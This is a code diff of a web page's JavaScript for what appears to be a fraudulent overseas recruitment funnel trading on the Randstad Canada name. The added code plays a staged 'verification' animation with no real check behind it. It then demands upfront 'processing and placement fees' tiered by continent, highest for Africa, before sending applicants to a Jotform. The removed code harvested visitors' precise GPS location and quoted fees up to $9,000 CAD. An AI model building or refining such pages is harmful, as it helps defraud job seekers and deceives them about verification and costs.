+            'Queensland': ['Brisbane', 'Gold Coast', 'Sunshine Coast', 'Townsville'],
+            'Western Australia': ['Perth', 'Fremantle', 'Mandurah', 'Bunbury'],
+            'South Australia': ['Adelaide', 'Mount Gambier', 'Whyalla']
+        },
+        'New Zealand': {
+            'Auckland': ['Auckland City', 'Manukau', 'North Shore', 'Waitakere'],
+            'Wellington': ['Wellington City', 'Lower Hutt', 'Porirua'],
+            'Canterbury': ['Christchurch', 'Timaru', 'Ashburton']
+        },
+        'Papua New Guinea': {
+            'National Capital': ['Port Moresby', 'Boroko'],
+            'Morobe': ['Lae', 'Bulolo']
+        },
+        'Fiji': {
+            'Central': ['Suva', 'Nausori'],
+            'Western': ['Nadi', 'Lautoka', 'Ba']
+        }
+    }
+};
+
+// ── REGION PRICING ──
+var regionPricing = {
+    'Africa': { amount: '$4,000 USD', currency: 'USD' },
+    'Middle East': { amount: '$3,000 USD', currency: 'USD' },
+    'Europe': { amount: '$2,000 USD', currency: 'USD' },
+    'North America': { amount: '$2,000 USD', currency: 'USD' },
+    'Caribbean': { amount: '$2,000 USD', currency: 'USD' },
+    'South America': { amount: '$2,000 USD', currency: 'USD' },
+    'Asia': { amount: '$2,000 USD', currency: 'USD' },
+    'Australia & Oceania': { amount: '$2,000 USD', currency: 'USD' }
+};
+
+// ── DROPDOWN CASCADE ──
+var selContinent = document.getElementById('selectContinent');
+var selCountry = document.getElementById('selectCountry');
+var selRegion = document.getElementById('selectRegion');
+var selCity = document.getElementById('selectCity');
+var confirmBtn = document.getElementById('confirmLocationBtn');
+
+function resetSelect(sel, label) {
+    sel.innerHTML = '<option value="">— Select ' + label + ' —</option>';
+    sel.disabled = true;
+}
+
+function checkConfirmBtn() {
+    var ready = selContinent.value && selCountry.value && selRegion.value && selCity.value;
+    confirmBtn.disabled = !ready;
+}
+
+selContinent.addEventListener('change', function() {
+    resetSelect(selCountry, 'Country');
+    resetSelect(selRegion, 'Region');
+    resetSelect(selCity, 'City');
+    checkConfirmBtn();
+    if (!this.value) return;
+    var countries = Object.keys(locationData[this.value] || {});
+    countries.forEach(function(c) {
+        var opt = document.createElement('option');
+        opt.value = c;
+        opt.textContent = c;
+        selCountry.appendChild(opt);
     });
-    document.getElementById('mobilityLink').addEventListener('click', function(e) {
-        e.preventDefault();
-        document.getElementById('menuOverlay').classList.remove('open');
-        document.body.style.overflow = '';
-        var target = document.getElementById('formContainer');
-        if (target.style.display === 'block') {
-            target.scrollIntoView({ behavior: 'smooth' });
+    selCountry.disabled = false;
+});
+
+selCountry.addEventListener('change', function() {
+    resetSelect(selRegion, 'Region');
+    resetSelect(selCity, 'City');
+    checkConfirmBtn();
+    if (!this.value) return;
+    var regions = Object.keys(locationData[selContinent.value][this.value] || {});
+    regions.forEach(function(r) {
+        var opt = document.createElement('option');
+        opt.value = r;
+        opt.textContent = r;
+        selRegion.appendChild(opt);
+    });
+    selRegion.disabled = false;
+});
+
+selRegion.addEventListener('change', function() {
+    resetSelect(selCity, 'City');
+    checkConfirmBtn();
+    if (!this.value) return;
+    var cities = locationData[selContinent.value][selCountry.value][this.value] || [];
+    cities.forEach(function(c) {
+        var opt = document.createElement('option');
+        opt.value = c;
+        opt.textContent = c;
+        selCity.appendChild(opt);
+    });
+    selCity.disabled = false;
+});
+
+selCity.addEventListener('change', checkConfirmBtn);
+
+// ── VERIFICATION ANIMATION ──
+function runVerification() {
+    var continent = selContinent.value;
+    var country = selCountry.value;
+    var region = selRegion.value;
+    var city = selCity.value;
+    var fullLocation = city + ', ' + region + ', ' + country + ', ' + continent;
+    var pricing = regionPricing[continent] || { amount: '$4,000 USD' };
+
+    document.getElementById('locationSection').style.display = 'none';
+    var loading = document.getElementById('verifyLoading');
+    loading.style.display = 'block';
+    loading.scrollIntoView({ behavior: 'smooth' });
+
+    var fill = document.getElementById('verifyBarFill');
+    var steps = ['step1', 'step2', 'step3', 'step4'];
+    var progress = [20, 45, 70, 95];
+    var currentStep = 0;
+
+    function activateStep(i) {
+        if (i > 0) {
+            document.getElementById(steps[i-1]).classList.remove('active');
+            document.getElementById(steps[i-1]).classList.add('done');
+            document.getElementById(steps[i-1]).querySelector('.verify-step-dot').textContent = '';
+        }
+        if (i < steps.length) {
+            document.getElementById(steps[i]).classList.add('active');
+            fill.style.width = progress[i] + '%';
+        }
+    }
+
+    activateStep(0);
+
+    var interval = setInterval(function() {
+        currentStep++;
+        if (currentStep < steps.length) {
+            activateStep(currentStep);
         } else {
-            var gate = document.getElementById('affordGate');
-            if (gate.style.display === 'block') {
-                gate.scrollIntoView({ behavior: 'smooth' });
-            } else {
-                document.getElementById('gpsSection').scrollIntoView({ behavior: 'smooth' });
-            }
+            clearInterval(interval);
+            fill.style.width = '100%';
+            setTimeout(function() {
+                document.getElementById(steps[steps.length-1]).classList.remove('active');
+                document.getElementById(steps[steps.length-1]).classList.add('done');
+                loading.style.display = 'none';
+                showAffordGate(fullLocation, continent, country, region, city, pricing);
+            }, 500);
         }
-    });
+    }, 700);
+}
 
-    // ── FOOTER SECTIONS ──
-    document.querySelectorAll('.footer-section-btn').forEach(function(btn) {
-        btn.addEventListener('click', function() {
-            this.classList.toggle('open');
-            var links = this.nextElementSibling;
-            links.classList.toggle('open');
-        });
-    });
+confirmBtn.addEventListener('click', runVerification);
 
-    // ── REGION MAP ──
-    var regionMap = {
-        'Ghana': 'West Africa', 'Nigeria': 'West Africa', 'Senegal': 'West Africa',
-        'Ivory Coast': 'West Africa', 'Côte d\'Ivoire': 'West Africa',
-        'Burkina Faso': 'West Africa', 'Mali': 'West Africa', 'Guinea': 'West Africa',
-        'Benin': 'West Africa', 'Togo': 'West Africa', 'Sierra Leone': 'West Africa',
-        'Liberia': 'West Africa', 'Gambia': 'West Africa', 'Guinea-Bissau': 'West Africa',
-        'Cape Verde': 'West Africa', 'Mauritania': 'West Africa', 'Niger': 'West Africa',
-        'Kenya': 'East Africa', 'Uganda': 'East Africa', 'Tanzania': 'East Africa',
-        'Ethiopia': 'East Africa', 'Rwanda': 'East Africa', 'Burundi': 'East Africa',
-        'Somalia': 'East Africa', 'Eritrea': 'East Africa', 'Djibouti': 'East Africa',
-        'South Sudan': 'East Africa', 'Madagascar': 'East Africa', 'Comoros': 'East Africa',
-        'South Africa': 'Southern Africa', 'Zimbabwe': 'Southern Africa',
-        'Zambia': 'Southern Africa', 'Mozambique': 'Southern Africa',
-        'Botswana': 'Southern Africa', 'Namibia': 'Southern Africa',
-        'Lesotho': 'Southern Africa', 'Eswatini': 'Southern Africa',
-        'Malawi': 'Southern Africa', 'Angola': 'Southern Africa',
-        'Democratic Republic of the Congo': 'Central Africa',
-        'Republic of the Congo': 'Central Africa', 'Cameroon': 'Central Africa',
-        'Central African Republic': 'Central Africa', 'Chad': 'Central Africa',
-        'Gabon': 'Central Africa', 'Equatorial Guinea': 'Central Africa',
-        'Egypt': 'North Africa', 'Morocco': 'North Africa', 'Algeria': 'North Africa',
-        'Tunisia': 'North Africa', 'Libya': 'North Africa', 'Sudan': 'North Africa',
-        'United Kingdom': 'Europe', 'France': 'Europe', 'Germany': 'Europe',
-        'Italy': 'Europe', 'Spain': 'Europe', 'Portugal': 'Europe',
-        'Netherlands': 'Europe', 'Belgium': 'Europe', 'Ireland': 'Europe',
-        'Sweden': 'Europe', 'Norway': 'Europe', 'Denmark': 'Europe',
-        'Finland': 'Europe', 'Poland': 'Europe', 'Romania': 'Europe',
-        'Greece': 'Europe', 'Switzerland': 'Europe', 'Austria': 'Europe',
-        'United Arab Emirates': 'Middle East', 'Saudi Arabia': 'Middle East',
-        'Qatar': 'Middle East', 'Kuwait': 'Middle East', 'Bahrain': 'Middle East',
-        'Oman': 'Middle East', 'Jordan': 'Middle East', 'Lebanon': 'Middle East',
-        'Iraq': 'Middle East', 'Iran': 'Middle East', 'Israel': 'Middle East',
-        'India': 'Asia', 'Philippines': 'Asia', 'Pakistan': 'Asia',
-        'Bangladesh': 'Asia', 'Sri Lanka': 'Asia', 'Nepal': 'Asia',
-        'China': 'Asia', 'Japan': 'Asia', 'South Korea': 'Asia',
-        'Indonesia': 'Asia', 'Malaysia': 'Asia', 'Thailand': 'Asia',
-        'United States': 'North America', 'Canada': 'North America', 'Mexico': 'North America',
-        'Jamaica': 'Caribbean', 'Trinidad and Tobago': 'Caribbean',
-        'Barbados': 'Caribbean', 'Bahamas': 'Caribbean', 'Haiti': 'Caribbean',
-        'Dominican Republic': 'Caribbean', 'Cuba': 'Caribbean',
-        'Brazil': 'South America', 'Colombia': 'South America',
-        'Venezuela': 'South America', 'Argentina': 'South America',
-        'Peru': 'South America', 'Chile': 'South America',
-        'Australia': 'Australia & Oceania', 'New Zealand': 'Australia & Oceania'
-    };
+// ── AFFORDABILITY GATE ──
+function showAffordGate(fullLocation, continent, country, region, city, pricing) {
+    var conditions = 'For candidates applying from <strong>' + continent + ' (' + country + ')</strong>, ' +
+        'note that the following conditions apply: A processing and placement fee of ' +
+        '<strong>' + pricing.amount + '</strong> is required, covering visa facilitation, ' +
+        'medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
 
-    function getRegion(country) { return regionMap[country] || 'International'; }
+    var text = '<strong>📍 Your location is:</strong> ' + city + ', ' + region + ', ' + country + '<br><br>' + conditions;
+    document.getElementById('locationText').innerHTML = text;
+    document.getElementById('affordGate').style.display = 'block';
+    document.getElementById('affordGate').scrollIntoView({ behavior: 'smooth' });
 
-    function showAffordGate(address, region) {
-        var text = '<strong>📍 Your location is:</strong> ' + address + '<br><br>' +
-            'For candidates applying from <strong>' + region + '</strong>, note that the following conditions apply: ' +
-            'A processing and placement fee of up to <strong>$9,000 CAD</strong> is required, covering visa facilitation, ' +
-            'medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
-        document.getElementById('locationText').innerHTML = text;
-        document.getElementById('affordGate').style.display = 'block';
-        setTimeout(function() {
-            document.getElementById('affordGate').scrollIntoView({ behavior: 'smooth' });
-        }, 300);
-    }
+    // Store for form loading
+    window._selectedLocation = fullLocation;
+    window._selectedContinent = continent;
+    window._selectedCountry = country;
+    window._selectedRegion = region;
+    window._selectedCity = city;
+    window._selectedPricing = pricing;
+}
 
-    function loadForm() {
-        var region = getRegion(detectedCountry);
-        var conditions = 'For candidates applying from ' + region + ', note that the following conditions apply: A processing and placement fee of up to $9,000 CAD is required, covering visa facilitation, medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
-        var encodedAddress = encodeURIComponent(detectedAddress);
-        var encodedConditions = encodeURIComponent(conditions);
-        document.getElementById('formContainer').style.display = 'block';
-        document.getElementById('jotformFrame').src =
-            'https://form.jotform.com/261934634754566?currentLocation99=' + encodedAddress +
-            '&applicationConditions=' + encodedConditions;
-        setTimeout(function() {
-            document.getElementById('formContainer').scrollIntoView({ behavior: 'smooth' });
-        }, 300);
-    }
+document.getElementById('yesBtn').addEventListener('click', function() {
+    document.getElementById('affordGate').style.display = 'none';
+    loadForm();
+});
 
-    // ── AFFORDABILITY BUTTONS ──
-    document.getElementById('yesBtn').addEventListener('click', function() {
-        document.getElementById('affordGate').style.display = 'none';
-        loadForm();
-    });
-    document.getElementById('noBtn').addEventListener('click', function() {
-        document.getElementById('affordGate').style.display = 'none';
-        document.getElementById('notEligible').style.display = 'block';
-        setTimeout(function() {
-            document.getElementById('notEligible').scrollIntoView({ behavior: 'smooth' });
-        }, 300);
-    });
-    document.getElementById('restartBtn').addEventListener('click', function() {
-        document.getElementById('notEligible').style.display = 'none';
-        document.getElementById('affordGate').style.display = 'block';
-        setTimeout(function() {
-            document.getElementById('affordGate').scrollIntoView({ behavior: 'smooth' });
-        }, 300);
-    });
+document.getElementById('noBtn').addEventListener('click', function() {
+    document.getElementById('affordGate').style.display = 'none';
+    document.getElementById('notEligible').style.display = 'block';
+    setTimeout(function() {
+        document.getElementById('notEligible').scrollIntoView({ behavior: 'smooth' });
+    }, 300);
+});
 
-    // ── GPS ──
-    function showProgress() {
-        document.getElementById('gpsBanner').style.display = 'none';
-        document.getElementById('progressWrap').style.display = 'block';
-        var fill = document.getElementById('progressFill');
-        fill.style.animation = 'none';
-        fill.offsetHeight;
-        fill.style.animation = 'progressAnim 3s ease-in-out forwards';
-    }
-    function hideProgress() {
-        document.getElementById('progressWrap').style.display = 'none';
-    }
+document.getElementById('restartBtn').addEventListener('click', function() {
+    document.getElementById('notEligible').style.display = 'none';
+    document.getElementById('locationSection').style.display = 'block';
+    document.getElementById('locationSection').scrollIntoView({ behavior: 'smooth' });
+});
 
-    function retryLocation() {
-        document.getElementById('gpsDenied').style.display = 'none';
-        document.getElementById('gpsBanner').style.display = 'block';
-        document.getElementById('gpsBanner').className = 'gps-banner waiting';
-        document.getElementById('gpsBanner').innerHTML =
-            '📍 Please allow location access when your browser asks.<br><br>' +
-            '<button class="gps-allow-btn" id="gpsBtn2">📍 Try Again</button>';
-        document.getElementById('gpsBtn2').addEventListener('click', getLocation);
-    }
-    document.getElementById('retryBtn').addEventListener('click', retryLocation);
+// ── LOAD FORM ──
+function loadForm() {
+    var continent = window._selectedContinent || '';
+    var country = window._selectedCountry || '';
+    var region = window._selectedRegion || '';
+    var city = window._selectedCity || '';
+    var pricing = window._selectedPricing || { amount: '$4,000 USD' };
+    var fullLocation = city + ', ' + region + ', ' + country;
 
-    function getLocation() {
-        showProgress();
-        if (!navigator.geolocation) {
-            hideProgress();
-            document.getElementById('gpsBanner').style.display = 'none';
-            document.getElementById('gpsDenied').style.display = 'block';
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                var lat = position.coords.latitude;
-                var lng = position.coords.longitude;
-                fetch('https://nominatim.openstreetmap.org/reverse?lat=' + lat + '&lon=' + lng + '&format=json')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    detectedAddress = data.display_name || (lat.toFixed(6) + ', ' + lng.toFixed(6));
-                    detectedCountry = (data.address && data.address.country) ? data.address.country : 'Unknown';
-                    var region = getRegion(detectedCountry);
-                    hideProgress();
-                    document.getElementById('gpsBanner').style.display = 'block';
-                    document.getElementById('gpsBanner').className = 'gps-banner success';
-                    document.getElementById('gpsBanner').innerHTML = '✅ Location verified: <strong>' + detectedAddress + '</strong>';
-                    showAffordGate(detectedAddress, region);
-                })
-                .catch(function() {
-                    detectedAddress = lat.toFixed(6) + ', ' + lng.toFixed(6);
-                    detectedCountry = 'Unknown';
-                    hideProgress();
-                    document.getElementById('gpsBanner').style.display = 'block';
-                    document.getElementById('gpsBanner').className = 'gps-banner success';
-                    document.getElementById('gpsBanner').innerHTML = '✅ Location verified: <strong>' + detectedAddress + '</strong>';
-                    showAffordGate(detectedAddress, getRegion(detectedCountry));
-                });
-            },
-            function(error) {
-                hideProgress();
-                document.getElementById('gpsBanner').style.display = 'none';
-                document.getElementById('gpsDenied').style.display = 'block';
-                setTimeout(function() {
-                    document.getElementById('gpsDenied').scrollIntoView({ behavior: 'smooth' });
-                }, 300);
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-    }
+    var conditions = 'For candidates applying from ' + continent + ' (' + country + '), note that the following conditions apply: A processing and placement fee of ' + pricing.amount + ' is required, covering visa facilitation, medical examination, and travel coordination. Randstad Canada handles all employer matching and job placement.';
 
-    document.getElementById('gpsBtn').addEventListener('click', getLocation);
+    var encodedAddress = encodeURIComponent(fullLocation);
+    var encodedConditions = encodeURIComponent(conditions);
+
+    document.getElementById('formContainer').style.display = 'block';
+    document.getElementById('jotformFrame').src =
+        'https://form.jotform.com/261934634754566?currentLocation99=' + encodedAddress +
+        '&applicationConditions=' + encodedConditions;
+    setTimeout(function() {
+        document.getElementById('formContainer').scrollIntoView({ behavior: 'smooth' });
+    }, 300);
+}
 </script>
 
 </body>
